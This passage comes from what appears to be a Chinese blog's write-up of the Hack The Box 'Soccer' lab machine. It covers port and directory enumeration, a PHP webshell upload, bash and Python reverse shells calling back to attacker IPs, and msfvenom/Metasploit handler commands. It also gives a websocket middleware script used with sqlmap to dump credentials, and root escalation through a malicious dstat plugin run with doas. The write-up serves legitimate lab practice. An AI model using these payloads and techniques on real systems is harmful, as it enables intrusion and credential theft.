string">"HTTP/1\.1\x20404\x20Not\x20Found\r\SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-OpSF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCoSF:ntent-Length:\x20139\r\nDate:\x20Tue,\x2030\x20May\x202023\x2013:04:42\SF:x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html>\n&lt;html\x20langSF:=\"en\">\n&lt;head>\n&lt;meta\x20charset=\"utf-8\">\n&lt;title>Error&lt;/title>\n&lt;/SF:head>\n&lt;body>\n&lt;pre>Cannot\x20GET\x20/&lt;/pre>\n&lt;/body>\n&lt;/html>\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>HTSF:TPOptions,16C,<span class="token string">"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-PolSF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nSF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\SF:r\nDate:\x20Tue,\x2030\x20May\x202023\x2013:04:43\x20GMT\r\nConnection:SF:\x20close\r\n\r\n&lt;!DOCTYPE\x20html>\n&lt;html\x20lang=\"en\">\n&lt;head>\n&lt;meSF:ta\x20charset=\"utf-8\">\n&lt;title>Error&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;pre>CSF:annot\x20OPTIONS\x20/&lt;/pre>\n&lt;/body>\n&lt;/html>\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>RTSPRequest,16C,<span class="token string">"HTSF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sSF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Tue,\SF:x2030\x20May\x202023\x2013:04:43\x20GMT\r\nConnection:\x20close\r\n\r\nSF:&lt;!DOCTYPE\x20html>\n&lt;html\x20lang=\"en\">\n&lt;head>\n&lt;meta\x20charset=\"uSF:tf-8\">\n&lt;title>Error&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;pre>Cannot\x20OPTIONS\SF:x20/&lt;/pre>\n&lt;/body>\n&lt;/html>\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>RPCCheck,2F,<span class="token string">"HTTP/1\.1\x20400\x20BadSF:\x20Request\r\nConnection:\x20close\r\n\r\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>DNSVersionBindReqTCP,2FSF:,<span class="token string">"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"</span><span class="token punctuation">)</span>%SF:r<span class="token punctuation">(</span>DNSStatusRequestTCP,2F,<span class="token string">"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectSF:ion:\x20close\r\n\r\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>Help,2F,<span class="token string">"HTTP/1\.1\x20400\x20Bad\x20Request\rSF:\nConnection:\x20close\r\n\r\n"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>SSLSessionReq,2F,<span class="token string">"HTTP/1\.1\x20400\xSF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed portAggressive OS guesses: Linux 5.0 <span class="token punctuation">(</span>96%<span class="token punctuation">)</span>, Linux 4.15 - 5.6 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 5.3 - 5.4 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 2.6.32 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 5.0 - 5.3 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 3.1 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, Linux 3.2 <span class="token punctuation">(</span>95%<span class="token punctuation">)</span>, AXIS 210A or 211 Network Camera <span class="token punctuation">(</span>Linux 2.6.17<span class="token punctuation">)</span> <span class="token punctuation">(</span>94%<span class="token punctuation">)</span>, ASUS RT-N56U WAP <span class="token punctuation">(</span>Linux 3.4<span class="token punctuation">)</span> <span class="token punctuation">(</span>93%<span class="token punctuation">)</span>, Linux 3.16 <span class="token punctuation">(</span>93%<span class="token punctuation">)</span>No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.Network Distance: 2 hopsService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 34.80 seconds</code></pre><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/fscan<span class="token punctuation">]</span>└─$ ./fscan -h soccer       ___                              _    / _ \     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __  / /_\/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_\\_____\__ \ <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>  \____/     <span class="token operator">|</span>___/\___<span class="token operator">|</span>_<span class="token operator">|</span>  \__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\                        fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart <span class="token function">ping</span><span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target soccer          is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: 1soccer:9091 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission deniedsoccer:22 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission deniedsoccer:80 <span class="token function">open</span>Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: 3start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://soccer             code:301 len:178    title:301 Moved Permanently 跳转url: http://soccer.htb/Open result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://soccer.htb/        code:200 len:6917   title:Soccer - IndexOpen result.txt error, <span class="token function">open</span> result.txt: permission denied<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://soccer:9091        code:404 len:139    title:ErrorOpen result.txt error, <span class="token function">open</span> result.txt: permission denied</code></pre><p>80端口看没什么东西，也没有功能点，现在有四个思路：</p><ol><li>子域名爆破</li><li>目录爆破</li><li>9091端口后续利用</li><li>nday利用</li></ol><h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~]└─$ sudo gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u soccer.htb --append-domain[sudo] kali 的密码：===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:             http://soccer.htb[+] Method:          GET[+] Threads:         50[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:      gobuster/3.5[+] Timeout:         10s[+] Append Domain:   true===============================================================2023/05/30 21:20:00 Starting gobuster in VHOST enumeration mode===============================================================Progress: 99922 / 100001 (99.92%)===============================================================2023/05/30 21:26:20 Finished===============================================================</code></pre><p>‍</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~/Tools/dirsearch]└─$ sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,301 -u http://soccer.htb/FUZZ        /'___\  /'___\           /'___\          /\ \__/ /\ \__/  __  __  /\ \__/          \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/           \ \_\   \ \_\  \ \____/  \ \_\             \/_/    \/_/   \/___/    \/_/          v2.0.0-dev________________________________________________ :: Method           : GET :: URL              : http://soccer.htb/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 100 :: Matcher          : Response status: 200,301________________________________________________...[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 165ms]    * FUZZ: tiny...</code></pre><pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~]└─$ sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://soccer.htb/              ===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://soccer.htb/[+] Method:                  GET[+] Threads:                 50[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.5[+] Timeout:                 10s===============================================================2023/05/30 21:55:49 Starting gobuster in directory enumeration mode===============================================================/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]                                                                         Progress: 172328 / 220561 (78.13%)^C[!] Keyboard interrupt detected, terminating.===============================================================2023/05/30 22:08:10 Finished===============================================================</code></pre><p>都扫到了&#x2F;tiny目录，访问看看：</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230530221057-4doidfd.png" alt="image">​</p><p>账号密码：</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230530220616-slv59tw.png" alt="image">​</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>有个文件上传的地方只能执行一次命令，执行完一次就会给删了</p><p>另外说一句这里好像有和公网服务器交互，不上梯子很卡，上完梯子之后好多了</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531090120-p22x1uv.png" alt="image">​</p><p>‍</p><p>我们上传文件：</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531090142-e2hv6o1.png" alt="image">​</p><p>普通的一句话木马就可以了</p><p>上传完访问<code>/tiny/uploads/shell.php</code>​就可以访问到木马了，这里只能执行一次，利用反弹shell</p><ol><li><p>curl反弹shell</p><p> 本地服务器新建一个文件，命名1.html,内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.9/2333 0&gt;&amp;1|bash</code>​</p><p> 使用木马发送curl 10.10.14.9&#x2F;1.html|bash</p></li><li><p>用msf的反弹shel</p><p> <code>msfvenom -p php/meterpreter/reverse_tcpLHOST=10.10.14.9 LPORT=4444 R &gt; shell1.php</code>​</p><p> <code>msf &gt; use exploit/multi/handler</code>​</p><p> <code>msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</code>​</p><p> <code>msfexploit(multi/handler) &gt; set LHOST 10.10.14.9</code>​</p><p> <code>msfexploit(multi/handler) &gt; set LPORT 4444</code>​</p></li></ol><p>‍</p><p>拿到shell之后发现权限很低，找办法提权，发现<code>sudo -l</code>​或者<code>suid提权</code>​什么的都行不通</p><p>学到这样一个知识：</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531092834-7ecsew9.png" alt="image">​</p><p>‍</p><p>那我们就去服务器下寻找他nginx的相关配置文件：<code>/etc/nginx/sites-enabled</code>​</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531132509-sxbwtqf.png" alt="image">​</p><p>发现一个子域名，添加到<code>/etc/hosts</code>​</p><p>访问后进行注册登陆：（登陆注册过程中并未测到有用漏洞）</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531133510-u785j2e.png" alt="image">​​​</p><p>这里可以对发送的数据进行抓包并进行测试：</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531133752-bbb3cc1.png" alt="image">​</p><p>可以看到这里是存在sql注入的，但是发现写脚本去测试好像总是返回404，测试不了</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531134631-npn5g99.png" alt="image">​</p><p>后来发现可以自己搭建一个类似中转站的东西，可以看网页源代码：</p><p>​<img src="https://qing3feng.github.io/Blogimages/HTB_soccer/image-20230531190839-8l64079.png" alt="image">​</p><p>这里是建立了一个ws的接口用于发送数据</p><p>我们可以通过以下脚本连建立连接从而可以使用sqlmap来进行注入</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> SimpleHTTPRequestHandler<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> TCPServer<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span> urlparse<span class="token keyword">from</span> websocket <span class="token keyword">import</span> create_connectionws_server <span class="token operator">=</span> <span class="token string">"ws://soc-player.soccer.htb:9091"</span> <span class="token comment" spellcheck="true"># 要修改</span><span class="token keyword">def</span> <span class="token function">send_ws</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_server<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># If the server returns a response on connect, use below line</span>    <span class="token comment" spellcheck="true">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span>    <span class="token comment" spellcheck="true"># For our case, format the payload in JSON</span>    message <span class="token operator">=</span> unquote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># replacing " with ' to avoid breaking JSON structure</span>    data <span class="token operator">=</span> <span class="token string">'{"id":"%s"}'</span> <span class="token operator">%</span> message <span class="token comment" spellcheck="true"># 要修改</span>    ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    resp <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> resp<span class="token punctuation">:</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">middleware_server</span><span class="token punctuation">(</span>host_port<span class="token punctuation">,</span>content_type<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                payload <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                payload <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>                content <span class="token operator">=</span> send_ws<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                content <span class="token operator">=</span> <span class="token string">'No parameters specified!'</span>            self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span> content_type<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>    <span class="token keyword">class</span> <span class="token class-name">_TCPServer</span><span class="token punctuation">(</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>        allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>    httpd <span class="token operator">=</span> _TCPServer<span class="token punctuation">(</span>host_port<span class="token punctuation">,</span> CustomHandler<span class="token punctuation">)</span>    httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Starting MiddleWare Server"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Send payloads in http://localhost:8081/?id=*"</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    middleware_server<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">8081</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p>sqlmap命令如下：</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ sqlmap -u <span class="token string">"http://127.0.0.1:8081/?id=59268 and 1=1"</span> --dump        ___       __H__                                                               ___ ___<span class="token punctuation">[</span>"<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">{</span>1.7.2<span class="token comment" spellcheck="true">#stable}                                  </span><span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token keyword">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token keyword">.</span> <span class="token operator">|</span>                                                 <span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>.<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>                                                       <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">[</span>17:44:02<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: 1<span class="token punctuation">[</span>17:44:02<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming partial value: player@player.<span class="token punctuation">[</span>17:44:02<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> <span class="token punctuation">(</span>case<span class="token punctuation">)</span> time-based comparison requires larger statistical model, please wait<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span><span class="token keyword">do</span> you want sqlmap to try to optimize value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> DBMS delay responses <span class="token punctuation">(</span>option <span class="token string">'--time-sec'</span><span class="token punctuation">)</span>? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> <span class="token punctuation">[</span>18:00:11<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions <span class="token punctuation">[</span>18:00:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> adjusting <span class="token function">time</span> delay to 2 seconds due to good response <span class="token function">times</span>htb<span class="token punctuation">[</span>18:00:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: 1324<span class="token punctuation">[</span>18:01:31<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: PlayerO<span class="token punctuation">[</span>18:02:56<span class="token punctuation">]</span> <span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> invalid character detected. retrying<span class="token punctuation">..</span><span class="token punctuation">[</span>18:02:56<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> increasing <span class="token function">time</span> delay to 3 secondsftheMatch2022<span class="token punctuation">[</span>18:05:42<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: playerDatabase: soccer_dbTable: accounts<span class="token punctuation">[</span>1 entry<span class="token punctuation">]</span>+------+-------------------+----------------------+----------+<span class="token operator">|</span> <span class="token function">id</span>   <span class="token operator">|</span> email             <span class="token operator">|</span> password             <span class="token operator">|</span> username <span class="token operator">|</span>+------+-------------------+----------------------+----------+<span class="token operator">|</span> 1324 <span class="token operator">|</span> player@player.htb <span class="token operator">|</span> PlayerOftheMatch2022 <span class="token operator">|</span> player   <span class="token operator">|</span>+------+-------------------+----------------------+----------+<span class="token punctuation">[</span>18:07:03<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> table <span class="token string">'soccer_db.accounts'</span> dumped to CSV <span class="token function">file</span> <span class="token string">'/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/soccer_db/accounts.csv'</span>         <span class="token punctuation">[</span>18:07:03<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/127.0.0.1'</span>                                           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 18:07:03 /2023-05-31/</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>ssh登陆后就是提权了，发现sudo -l用不了</p><p>就用<code>find / -perm -u=s -type f 2 &gt;/dev/null</code></p><pre class=" language-bash"><code class="language-bash">player@soccer:~$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null/usr/local/bin/doas/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/bin/umount/usr/bin/fusermount/usr/bin/mount/usr/bin/su/usr/bin/newgrp/usr/bin/chfn/usr/bin/sudo/usr/bin/passwd/usr/bin/gpasswd/usr/bin/chsh/usr/bin/at/snap/snapd/17883/usr/lib/snapd/snap-confine/snap/core20/1695/usr/bin/chfn/snap/core20/1695/usr/bin/chsh/snap/core20/1695/usr/bin/gpasswd/snap/core20/1695/usr/bin/mount/snap/core20/1695/usr/bin/newgrp/snap/core20/1695/usr/bin/passwd/snap/core20/1695/usr/bin/su/snap/core20/1695/usr/bin/sudo/snap/core20/1695/usr/bin/umount/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/1695/usr/lib/openssh/ssh-keysign</code></pre><p>刚开始找一圈没找到提权的点，后来才知道<code>/usr/local/bin/doas</code>​可以提权</p><p>这个如何提权呢</p><p>在<code>/usr/local/share/dstat/</code>​下创建一个文件命名为：<code>dstat_shell.py</code>​,内容为：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"bash -i"</span><span class="token punctuation">)</span></code></pre><p>输入命令：</p><p>​<code>doas -u root /usr/bin/dstat --list</code>​  -&gt; 查看可用插件</p><pre class=" language-bash"><code class="language-bash">player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --listinternal: aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old, epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net, page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time, udp,unix,vm,vm-adv,zones/usr/share/dstat: battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu, disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat, dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs, gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops, jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn, mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats, mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb, mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys, net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops, nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc, rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net, snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio, top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime, top-cputime-avg,top-int,top-io,top-io-adv,top-latency, top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem, vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc, wifi,zfs-arc,zfs-l2arc,zfs-zil/usr/local/share/dstat: shell</code></pre><p>如果看到<code>/usr/local/share/dstat</code>​有shell则说明可以利用了：</p><pre class=" language-bash"><code class="language-bash">player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --shell/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated <span class="token keyword">in</span> favour of importlib<span class="token punctuation">;</span> see the module's documentation <span class="token keyword">for</span> alternative uses  <span class="token function">import</span> improot@soccer:/usr/local/share/dstat<span class="token comment" spellcheck="true"># cd /root</span>root@soccer:~<span class="token comment" spellcheck="true"># cat root.txt</span>1806c1110c263bxxxxxxxxxxxxx</code></pre><p>提权的原理大概就是doas是一个类似于sudo的命令，他有插件,保存的位置如下：</p><pre class=" language-xml"><code class="language-xml"> /usr/share/dstat/ /usr/local/share/dstat/</code></pre><p>因为dstat是支持用户自定义插件的，所以如果用户对这两个目录有可写入权限，那么就可以利用插件提权。</p><p>不仅可以写入：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"bash -i"</span><span class="token punctuation">)</span></code></pre><p>还可以写入反弹shell：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.64.128"</span><span class="token punctuation">,</span><span class="token number">2333</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB_MonitorsTwo</title>
      <link href="/2023/05/30/HTB%20MonitorsTwo/"/>
      <url>/2023/05/30/HTB%20MonitorsTwo/</url>
      
